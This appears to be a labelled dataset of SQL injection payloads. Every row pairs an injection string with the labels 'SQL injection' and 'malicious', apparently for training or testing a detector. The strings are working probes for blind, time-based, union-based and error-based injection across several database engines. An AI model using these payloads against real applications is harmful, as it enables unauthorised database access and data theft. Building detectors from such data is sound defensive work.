payload;attack_type;label
-1354)) or 8571=8571--;SQL injection;malicious
1' in boolean mode) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#;SQL injection;malicious
1%'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('%'=';SQL injection;malicious
-7324) or make_set(8486=6544,6544);SQL injection;malicious
1 and 6969=(select 6969 from pg_sleep(5))-- yczq;SQL injection;malicious
"1"" where 6023=6023;if(1928=4811) select 1928 else drop function ucko--";SQL injection;malicious
1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('qtfl'='qtfl;SQL injection;malicious
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--";SQL injection;malicious
"1%""));select (case when (1499=4923) then 1499 else 1/(select 0) end)--";SQL injection;malicious
1) where 9724=9724 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--;SQL injection;malicious
1%') union all select null,null,null,null,null,null--;SQL injection;malicious
"-4135"") as leiz where 3582=3582 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--";SQL injection;malicious
1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('rfln'='rfln;SQL injection;malicious
-4339) where 7178=7178 or 4008=7232;SQL injection;malicious
1' where 3125=3125 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--;SQL injection;malicious
"1%"");select pg_sleep(5)--";SQL injection;malicious
"-1083%""))) or elt(1032=1032,3623) and (((""%""=""";SQL injection;malicious
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""yxes"" like ""yxes";SQL injection;malicious
"1%"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""%""=""";SQL injection;malicious
1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3);SQL injection;malicious
1)) or 8514=benchmark(5000000,md5(0x544d5a4c))#;SQL injection;malicious
1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'fjfo'='fjfo;SQL injection;malicious
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--";SQL injection;malicious
"1"")) and 7656=5604 and ((""zuhv""=""zuhv";SQL injection;malicious
1%') or sleep(5)#;SQL injection;malicious
"-9111"" or 3038=3038";SQL injection;malicious
"1)));select case when 7717=7717 then 1 else null end--";SQL injection;malicious
"1%')));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--";SQL injection;malicious
1') and 7290=8416 and ('ktlz' like 'ktlz;SQL injection;malicious
"-7940%"") union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#";SQL injection;malicious
"1"")) as ubrg where 7318=7318 and 7331=6529--";SQL injection;malicious
"1) as hvsk where 7902=7902;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--";SQL injection;malicious
"1%""))) union all select null,null,null,null,null,null,null,null,null--";SQL injection;malicious
"1%"";begin user_lock.sleep(5); end and ""%""=""";SQL injection;malicious
1' union all select null,null,null#;SQL injection;malicious
"1"");(select * from (select(sleep(5)))acdk)#";SQL injection;malicious
"1"") and (3020=3020)*6703 and (""qowc"" like ""qowc";SQL injection;malicious
-2248'+(select wuow where 4421=4421 union all select 4421,4421,4421,4421,4421,4421--;SQL injection;malicious
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#";SQL injection;malicious
1'+(select hspl where 4530=4530 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--;SQL injection;malicious
"1')));select pg_sleep(5)--";SQL injection;malicious
"1') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--";SQL injection;malicious
"1);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--";SQL injection;malicious
"1%""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--";SQL injection;malicious
1')) and elt(6847=5874,5874) and (('yspu'='yspu;SQL injection;malicious
-9996' or make_set(1237=7111,7111);SQL injection;malicious
-5728) where 8663=8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#;SQL injection;malicious
1))) union all select null,null,null,null,null,null,null,null,null#;SQL injection;malicious
-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#;SQL injection;malicious
1) as pqle where 4039=4039 and 7533=7533--;SQL injection;malicious
"1)) as wajy where 8593=8593;call regexp_substring(repeat(right(char(2385),0),500000000),null)--";SQL injection;malicious
1)) and elt(9288=6067,6067) and ((1895=1895;SQL injection;malicious
-7184) as fshx where 3408=3408 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--;SQL injection;malicious
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""rugr""=""rugr";SQL injection;malicious
"1')));begin user_lock.sleep(5); end and ((('gqhc'='gqhc";SQL injection;malicious
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)";SQL injection;malicious
1' where 7191=7191 rlike sleep(5)--;SQL injection;malicious
-1859' union all select 1781,1781,1781,1781#;SQL injection;malicious
"1')));select case when 2948=7279 then 1 else null end--";SQL injection;malicious
"1"") and 7533=7533 and (""jfsw"" like ""jfsw";SQL injection;malicious
-4413%')) union all select 1345,1345#;SQL injection;malicious
1')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('tpcm' like 'tpcm;SQL injection;malicious
-7103)) or 4610=1871 and ((1249=1249;SQL injection;malicious
-4410 where 5749=5749 or 1317=9823--;SQL injection;malicious
"1')));select case when 3819=1887 then 1 else null end--";SQL injection;malicious
1')) and sleep(5) and (('jiio' like 'jiio;SQL injection;malicious
1%') and make_set(8403=8403,8899) and ('%'=';SQL injection;malicious
1' in boolean mode) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--;SQL injection;malicious
-5082)) union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#;SQL injection;malicious
1') as hvyx where 3194=3194 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--;SQL injection;malicious
-9175')) union all select 6174,6174,6174,6174--;SQL injection;malicious
"1'||(select 'bupa' from dual where 8548=8548;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--";SQL injection;malicious
"1'||(select 'bezt' where 7876=7876;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#";SQL injection;malicious
-6081 where 3681=3681 or 2603=3138--;SQL injection;malicious
"1"" where 3990=3990 and 8594=(select 8594 from pg_sleep(5))--";SQL injection;malicious
-3071)) as uiiu where 8910=8910 union all select 8910,8910,8910,8910,8910,8910,8910#;SQL injection;malicious
1') or (select * from (select(sleep(5)))ydpu) and ('zaes'='zaes;SQL injection;malicious
1) and elt(7425=8842,8842) and (9194=9194;SQL injection;malicious
"1%"") rlike (select * from (select(sleep(5)))sgvo) and (""%""=""";SQL injection;malicious
1%') union all select null,null,null#;SQL injection;malicious
"1)) as pmff where 6649=6649;begin user_lock.sleep(5); end--";SQL injection;malicious
"-7347"")) union all select 4360,4360,4360,4360,4360,4360,4360,4360,4360#";SQL injection;malicious
"1' in boolean mode);select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual#";SQL injection;malicious
1' in boolean mode) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--;SQL injection;malicious
-1583') or elt(1032=1032,3623) and ('jrcj' like 'jrcj;SQL injection;malicious
"1"") rlike (select * from (select(sleep(5)))sgvo) and (""fkmh""=""fkmh";SQL injection;malicious
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'ymnm'='ymnm;SQL injection;malicious
-1432 order by 1#;SQL injection;malicious
1) where 2734=2734 waitfor delay '0:0:5'--;SQL injection;malicious
-2793') where 2621=2621 union all select 2621#;SQL injection;malicious
-5585%'))) or 6990=7727;SQL injection;malicious
1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (5621=5621;SQL injection;malicious
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3";SQL injection;malicious
"1"" where 1809=1809 and make_set(8403=8403,8899)--";SQL injection;malicious
1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4);SQL injection;malicious
"1"") where 9962=9962 and 4595=4595#";SQL injection;malicious
1)) as pynj where 7683=7683 waitfor delay '0:0:5'--;SQL injection;malicious
"1"") where 6823=6823 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--";SQL injection;malicious
1')) or (select * from (select(sleep(5)))ydpu) and (('yqbo'='yqbo;SQL injection;malicious
1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))# lgoz;SQL injection;malicious
1') as siyk where 1514=1514 union all select null,null,null,null,null,null#;SQL injection;malicious
1'||(select 'owzs' where 1475=1475 union all select null--;SQL injection;malicious
"1"") where 3321=3321;begin dbms_lock.sleep(5); end--";SQL injection;malicious
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric);SQL injection;malicious
1') as rqzz where 4987=4987 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--;SQL injection;malicious
1' where 8430=8430 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--;SQL injection;malicious
1 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--;SQL injection;malicious
1'||(select 'scqw' where 3337=3337 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--;SQL injection;malicious
1) where 4710=4710 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--;SQL injection;malicious
-7111 union all select 2409,2409,2409,2409,2409,2409#;SQL injection;malicious
1') where 2330=2330 and (select * from (select(sleep(5)))fzno)--;SQL injection;malicious
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'gajm'='gajm";SQL injection;malicious
"1%"")));select (case when (8857=1512) then 8857 else 8857*(select 8857 from mysql.db) end)#";SQL injection;malicious
"1"")) as xwrq where 4161=4161;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--";SQL injection;malicious
1%') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('%'=';SQL injection;malicious
1) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (8450=8450;SQL injection;malicious
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""ctrr""=""ctrr";SQL injection;malicious
"1' in boolean mode);select benchmark(5000000,md5(0x4c4d6142))#";SQL injection;malicious
1'+(select qjng where 1897=1897 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+';SQL injection;malicious
"1"";iif(5257=5257,1,1/0)";SQL injection;malicious
1))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((7589=7589;SQL injection;malicious
1'+(select dagm where 5461=5461 or 8466=benchmark(5000000,md5(0x694a4745)))+';SQL injection;malicious
"1"") as wjdc where 8694=8694 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--";SQL injection;malicious
-5700 where 4238=4238 union all select 4238,4238,4238#;SQL injection;malicious
"1"") where 3445=3445 and elt(1212=1254,1254)--";SQL injection;malicious
"1'));select (case when (3855=3855) then 3855 else 1/(select 0) end)--";SQL injection;malicious
1'+(select dnxi where 5850=5850 or 8156=(select count(*) from generate_series(1,5000000))--;SQL injection;malicious
"-8025"") or (1436=4186)*4186 and (""sqwv"" like ""sqwv";SQL injection;malicious
"1"";begin dbms_lock.sleep(5); end and ""xouo"" like ""xouo";SQL injection;malicious
"-1174"" union all select 4303,4303,4303,4303#";SQL injection;malicious
"1%"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--";SQL injection;malicious
"1%"";begin dbms_lock.sleep(5); end and ""%""=""";SQL injection;malicious
"1"") as cysq where 5258=5258;select case when 1574=5523 then 1 else null end--";SQL injection;malicious
-8325)) as ajxq where 6630=6630 union all select 6630,6630,6630,6630,6630,6630--;SQL injection;malicious
1)) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--;SQL injection;malicious
"1%"");iif(5257=5257,1,1/0)";SQL injection;malicious
"1%"") or (select * from (select(sleep(5)))sddo)#";SQL injection;malicious
